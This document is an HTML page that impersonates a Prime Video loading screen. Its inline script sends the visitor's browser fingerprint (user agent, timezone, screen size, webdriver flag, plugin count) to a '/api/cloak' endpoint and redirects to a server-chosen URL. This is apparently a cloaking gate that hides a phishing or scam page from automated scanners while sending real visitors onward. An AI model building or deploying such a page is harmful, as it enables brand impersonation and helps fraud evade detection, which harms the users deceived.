<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Prime Video</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a242f;display:flex;align-items:center;justify-content:center;height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
.wrap{display:flex;flex-direction:column;align-items:center;gap:20px}
.logo{display:flex;align-items:center;gap:10px}
.logo-icon{width:36px;height:36px;background:#00a8e0;border-radius:8px;display:flex;align-items:center;justify-content:center}
.logo-icon svg{width:20px;height:20px;fill:#fff}
.logo-text{color:#fff;font-size:1.2rem;font-weight:700}
.logo-text span{color:#00a8e0}
.spinner{width:32px;height:32px;border:3px solid rgba(255,255,255,0.15);border-top-color:#00a8e0;border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.msg{color:#888;font-size:0.82rem;letter-spacing:0.3px}
</style>
<script>
(function() {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/api/cloak', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.timeout = 7000;
  xhr.ontimeout = xhr.onerror = function() {
    window.location.href = '/amazon-prime';
  };
  xhr.onload = function() {
    try {
      var r = JSON.parse(xhr.responseText);
      window.location.href = r.url || '/amazon-prime';
    } catch(e) {
      window.location.href = '/amazon-prime';
    }
  };
  xhr.send(JSON.stringify({
    ua: navigator.userAgent,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    sw: screen.width,
    sh: screen.height,
    wd: navigator.webdriver || false,
    pl: navigator.plugins ? navigator.plugins.length : 0
  }));
})();
</script>
</head>
<body>
<div class="wrap">
  <div class="logo">
    <div class="logo-icon">
      <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
    </div>
    <span class="logo-text">prime <span>video</span></span>
  </div>
  <div class="spinner"></div>
  <div class="msg">Loading&hellip;</div>
</div>
</body>
</html>
